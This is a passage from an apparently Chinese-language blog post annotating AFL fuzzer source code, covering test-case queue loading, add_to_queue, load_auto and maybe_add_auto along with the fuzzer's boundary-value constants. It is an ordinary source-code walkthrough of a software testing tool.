ENOTDIR<span class="token punctuation">)</span><span class="token comment">//目录或文件不存在或路径不是目录时提示输入目录无效</span>      <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST           <span class="token string">"The input directory does not seem to be valid - try again. The fuzzer needs\n"</span>           <span class="token string">"    one or more test case to start with - ideally, a small file under 1 kB\n"</span>           <span class="token string">"    or so. The cases must be stored as regular files directly in the input\n"</span>           <span class="token string">"    directory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open '%s'"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>shuffle_queue <span class="token operator">&amp;&amp;</span> nl_cnt <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Shuffling queue..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">shuffle_ptrs</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>nl<span class="token punctuation">,</span> nl_cnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//shuffle_queue 为真且扫描数量大于 1 则调用 shuffle_ptrs 重排 nl 里的指针的位置</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nl_cnt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span>    <span class="token comment">//获取 in_dir/文件名 和 in_dir/.state/deterministic_done/文件名 这两个字符串</span>    u8<span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/%s"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">,</span> nl<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    u8<span class="token operator">*</span> dfn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.state/deterministic_done/%s"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">,</span> nl<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    u8  passed_det <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>nl<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//释放对应 nl 空间</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">lstat</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> R_OK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">////检查文件状态，异常则报错退出</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to access '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">S_ISREG</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_mode<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>st<span class="token punctuation">.</span>st_size <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"/README.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检测并跳过目录、设备文件、空文件、README文件</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>dfn<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_size <span class="token operator">></span> MAX_FILE<span class="token punctuation">)</span> <span class="token comment">//文件大小大于 MAX_FILE 则报错退出</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Test case '%s' is too big (%s, limit is %s)"</span><span class="token punctuation">,</span> fn<span class="token punctuation">,</span>            <span class="token function">DMS</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">DMS</span><span class="token punctuation">(</span>MAX_FILE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>dfn<span class="token punctuation">,</span> F_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> passed_det <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//in_dir/.state/deterministic_done/文件名 能打开则设置 passed_det = 1</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>dfn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_to_queue</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">,</span> passed_det<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将测试用例加入 queue</span>  <span class="token punctuation">&#125;</span>  <span class="token function">free</span><span class="token punctuation">(</span>nl<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>queued_paths<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//queued_paths 为 0，提示需要一个或多个 1kb 以内的测试用例，输入目录中没有可用的测试用例</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST         <span class="token string">"Looks like there are no valid test cases in the input directory! The fuzzer\n"</span>         <span class="token string">"    needs one or more test case to start with - ideally, a small file under\n"</span>         <span class="token string">"    1 kB or so. The cases must be stored as regular files directly in the\n"</span>         <span class="token string">"    input directory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"No usable test cases in '%s'"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  last_path_time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  queued_at_start <span class="token operator">=</span> queued_paths<span class="token punctuation">;</span><span class="token comment">//queueed_at_start = 队列元素数量</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h3><p>queue_entry结构体如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span> <span class="token operator">*</span>queue<span class="token punctuation">,</span>     <span class="token comment">/* Fuzzing queue (linked list)      */</span>                          <span class="token operator">*</span>queue_cur<span class="token punctuation">,</span> <span class="token comment">/* Current offset within the queue  */</span>                          <span class="token operator">*</span>queue_top<span class="token punctuation">,</span> <span class="token comment">/* Top of the list                  */</span>                          <span class="token operator">*</span>q_prev100<span class="token punctuation">;</span> <span class="token comment">/* Previous 100 marker              */</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span>  top_rated<span class="token punctuation">[</span>MAP_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment">/* Top entries for bitmap bytes     */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将用户测试用例读入 queue 队列</p><ul><li>为结构体开辟空间，设置 fname、len、passed_det，depth &#x3D; cur_depth + 1，depth 大于 max_depth 时更新 max_depth</li><li>如果 queue_top 不为空则将当前元素插入队尾，如果为空则设为队首</li><li>队列路径数和未 fuzz 的路径数分别 +1，cycles_wo_finds 置零</li><li>当已入队的路径数量 queued_paths 是100的倍数时，将每100个路径的前一个路径的 next_100 指针指向当前路径，将 <code>q_prev100</code> 更新为当前路径，为下一个100个路径做准备</li><li>获取当前时间为最后一个路径的时间</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">add_to_queue</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> fname<span class="token punctuation">,</span> u32 len<span class="token punctuation">,</span> u8 passed_det<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  q<span class="token operator">-></span>fname        <span class="token operator">=</span> fname<span class="token punctuation">;</span>  q<span class="token operator">-></span>len          <span class="token operator">=</span> len<span class="token punctuation">;</span>  q<span class="token operator">-></span>depth        <span class="token operator">=</span> cur_depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  q<span class="token operator">-></span>passed_det   <span class="token operator">=</span> passed_det<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>depth <span class="token operator">></span> max_depth<span class="token punctuation">)</span> max_depth <span class="token operator">=</span> q<span class="token operator">-></span>depth<span class="token punctuation">;</span><span class="token comment">//depth 大于 max_depth 时更新 max_depth</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>queue_top<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//queue_top 不为空则将当前元素插入队尾</span>    queue_top<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>    queue_top <span class="token operator">=</span> q<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> q_prev100 <span class="token operator">=</span> queue <span class="token operator">=</span> queue_top <span class="token operator">=</span> q<span class="token punctuation">;</span><span class="token comment">//为空则设为队首</span>  <span class="token comment">//队列路径数和为 fuzz 的路径数分别 +1，cycles_wo_finds 置零</span>  queued_paths<span class="token operator">++</span><span class="token punctuation">;</span>  pending_not_fuzzed<span class="token operator">++</span><span class="token punctuation">;</span>  cycles_wo_finds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>queued_paths <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    q_prev100<span class="token operator">-></span>next_100 <span class="token operator">=</span> q<span class="token punctuation">;</span>    q_prev100 <span class="token operator">=</span> q<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  last_path_time <span class="token operator">=</span> <span class="token function">get_cur_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h3><p>读入自动生成的提取出来的词典 token</p><ul><li>遍历 50 次，以只读的方式打开 in_dir&#x2F;.state&#x2F;auto_extras&#x2F;auto_%06u<ul><li>失败则释放文件名字符串并 break</li><li>成功则读 MAX_AUTO_EXTRA + 1 长度到 tmp，实际读取长度保存到 len，读取失败则报错退出</li></ul></li><li>读取长度在最大值和最小值之间则调用 <a href="##maybe_add_auto">maybe_add_auto</a> 按规则自动添加有效的额外数据到字典</li><li>提示加载的 tokens 的数量，如果为 0 则提示没有自动生成的字典 token</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">load_auto</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> USE_AUTO_EXTRAS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u8  tmp<span class="token punctuation">[</span>MAX_AUTO_EXTRA <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    u8<span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.state/auto_extras/auto_%06u"</span><span class="token punctuation">,</span> in_dir<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    s32 fd<span class="token punctuation">,</span> len<span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以只读的方式打开 in_dir/.state/auto_extras/auto_%06u</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//失败则释放文件名字符串并 break</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">!=</span> ENOENT<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> MAX_AUTO_EXTRA <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//成功则读 MAX_AUTO_EXTRA + 1 长度到 tmp，实际读取长度保存到 len</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to read from '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取失败则报错退出</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">>=</span> MIN_AUTO_EXTRA <span class="token operator">&amp;&amp;</span> len <span class="token operator">&lt;=</span> MAX_AUTO_EXTRA<span class="token punctuation">)</span><span class="token comment">//读取长度在最大值和最小值之间则调用 maybe_add_auto 按规则自动添加有效的额外数据到字典</span>      <span class="token function">maybe_add_auto</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Loaded %u auto-discovered dictionary tokens."</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"No auto-generated dictionary tokens to reuse."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h3><p>自动添加有效的额外数据（如潜在的重要字节序列）到一个动态字典中</p><p>afl-fuzz 中有两个词典：</p><ul><li>程序运行之初导入的用户词典，存放在 extras 数组</li><li>fuzzer 自动选择的 extra token 组成的词典，放在 a_extras 数组，最多 500 个，超过 500 个随机删除一个 250 往后的 token</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INTERESTING_8</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">,</span>          </span><span class="token comment">/* Overflow signed 8-bit when decremented  */</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>            </span><span class="token comment">/*                                         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">0</span><span class="token punctuation">,</span>            </span><span class="token comment">/*                                         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">1</span><span class="token punctuation">,</span>            </span><span class="token comment">/*                                         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">16</span><span class="token punctuation">,</span>           </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">32</span><span class="token punctuation">,</span>           </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">64</span><span class="token punctuation">,</span>           </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">100</span><span class="token punctuation">,</span>          </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">127</span>           </span><span class="token comment">/* Overflow signed 8-bit when incremented  */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INTERESTING_16</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">32768</span><span class="token punctuation">,</span>        </span><span class="token comment">/* Overflow signed 16-bit when decremented */</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">129</span><span class="token punctuation">,</span>          </span><span class="token comment">/* Overflow signed 8-bit                   */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">128</span><span class="token punctuation">,</span>          </span><span class="token comment">/* Overflow signed 8-bit                   */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">255</span><span class="token punctuation">,</span>          </span><span class="token comment">/* Overflow unsig 8-bit when incremented   */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">256</span><span class="token punctuation">,</span>          </span><span class="token comment">/* Overflow unsig 8-bit                    */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">512</span><span class="token punctuation">,</span>          </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">1000</span><span class="token punctuation">,</span>         </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">1024</span><span class="token punctuation">,</span>         </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">4096</span><span class="token punctuation">,</span>         </span><span class="token comment">/* One-off with common buffer size         */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">32767</span>         </span><span class="token comment">/* Overflow signed 16-bit when incremented */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INTERESTING_32</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">2147483648LL</span><span class="token punctuation">,</span> </span><span class="token comment">/* Overflow signed 32-bit when decremented */</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">100663046</span><span class="token punctuation">,</span>    </span><span class="token comment">/* Large negative number (endian-agnostic) */</span> <span class="token punctuation">\</span>  <span class="token expression"><span class="token operator">-</span><span class="token number">32769</span><span class="token punctuation">,</span>        </span><span class="token comment">/* Overflow signed 16-bit                  */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">32768</span><span class="token punctuation">,</span>        </span><span class="token comment">/* Overflow signed 16-bit                  */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">65535</span><span class="token punctuation">,</span>        </span><span class="token comment">/* Overflow unsig 16-bit when incremented  */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">65536</span><span class="token punctuation">,</span>        </span><span class="token comment">/* Overflow unsig 16 bit                   */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">100663045</span><span class="token punctuation">,</span>    </span><span class="token comment">/* Large positive number (endian-agnostic) */</span> <span class="token punctuation">\</span>   <span class="token expression"><span class="token number">2147483647</span>    </span><span class="token comment">/* Overflow signed 32-bit when incremented */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">extra_data</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> data<span class="token punctuation">;</span>                           <span class="token comment">/* Dictionary token data            */</span>  u32 len<span class="token punctuation">;</span>                            <span class="token comment">/* Dictionary token length          */</span>  u32 hit_cnt<span class="token punctuation">;</span>                        <span class="token comment">/* Use count in the corpus          */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">extra_data</span><span class="token operator">*</span> a_extras<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>用户指定了不使用 auto extras 即 USE_AUTO_EXTRAS &#x3D; 0 则返回</li><li>跳过连续相同字节，如果全部相同则返回</li><li>与内置的 interesting_16 和 interesting_32 比较，相同则返回</li><li>遍历 extras，与其中一项相同则返回</li><li>遍历 a_extras，与其中一项相同则增加该项命中率 hit_cnt 并跳转到 sort_a_extras<ul><li>sort_a_extras：按命中率对 a_extras 降序排序，按大小对前 USE_AUTO_EXTRAS 个条目排序</li></ul></li><li>未达到最大值就添加进 a_extras，达到最大值就从后半部分随机删除一项然后添加该项</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">maybe_add_auto</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> mem<span class="token punctuation">,</span> u32 len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>MAX_AUTO_EXTRAS <span class="token operator">||</span> <span class="token operator">!</span>USE_AUTO_EXTRAS<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//指定不使用 auto extras 则直接返回</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mem<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> mem<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//跳过连续相同字节</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> len<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">// 如果所有字节都相同，返回</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//长度为2和 interesting_16 比较相同则返回</span>    i <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>interesting_16<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u16<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span> <span class="token operator">==</span> interesting_16<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">||</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u16<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">SWAP16</span><span class="token punctuation">(</span>interesting_16<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">////长度为2和 interesting_32 比较相同则返回</span>    i <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>interesting_32<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span> <span class="token operator">==</span> interesting_32<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">||</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">SWAP32</span><span class="token punctuation">(</span>interesting_32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> extras_cnt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//extras 按从小到大，循环找到第一个长度大于等于 len 的 token</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">>=</span> len<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> extras_cnt <span class="token operator">&amp;&amp;</span> extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">==</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">memcmp_nocase</span><span class="token punctuation">(</span>extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span 